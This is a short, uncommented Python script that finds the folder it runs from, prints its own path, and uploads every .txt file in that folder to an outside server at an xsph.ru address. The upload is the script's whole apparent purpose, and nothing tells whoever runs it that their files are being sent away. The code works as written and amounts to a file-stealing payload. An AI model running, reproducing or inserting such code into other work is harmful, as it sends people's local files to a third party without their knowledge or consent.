import os,requests
p=os.path.dirname(__file__)
print(__file__)
requests.post('http://f0857914.xsph.ru',files={i:open(p+'/'+i,'rb')for i in os.listdir(p)if i.endswith('.txt')})
